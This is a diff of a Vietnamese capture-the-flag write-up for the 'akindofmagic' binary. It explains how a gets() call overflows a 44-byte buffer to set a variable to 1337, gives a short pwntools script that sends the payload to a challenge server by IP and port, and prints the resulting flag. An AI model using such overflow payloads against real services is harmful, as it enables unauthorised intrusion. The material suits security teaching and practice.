@@ -102,9 +102,29 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 ## Methodology
 Có thể thấy có 1 câu lệnh if kiểm tra điều kiện và in ra flag. Điều kiện để in ra được flag là "v5 = 1337", mà v5 lại được gán bằng 0 ở đầu hàm. Nên ta nghĩ ngay đến việc thay đổi biến v5 này. 
-Có thể thấy s được khai báo chỉ có 44 nhưng khi dùng hàm gets nhập lại có thể nhập được 64 nên có khai thác tại đây.\n
+
+Có thể thấy s được khai báo chỉ có 44 nhưng khi dùng hàm gets nhập lại có thể nhập được 64 nên có khai thác tại đây.
+
 Dựa vào mã assembly trên thì có thể thấy stack:
 
 ![image](https://user-images.githubusercontent.com/88301536/139680460-d9b608f7-0f95-484f-9388-bc16174e0fe3.png)
 
-Có thể dùng gdb chạy d
+Có thể dùng gdb chạy debug để tìm địa chỉ của stack
+
+## Exploit
+```python
+from pwn import *
+#r = process('./akindofmagic')
+r = remote('143.198.184.186', 5000)
+#raw_input('>>')
+pl = b'A'*44
+
+pl += p32(0x539)
+r.sendline(pl)
+r.interactive()
+```
+Chạy code  trên có được flag
+
+![image](https://user-images.githubusercontent.com/69805864/139617352-d7663cc0-d0ba-4b51-b109-3fe41fad1d77.png)
+
+## FLAG: flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
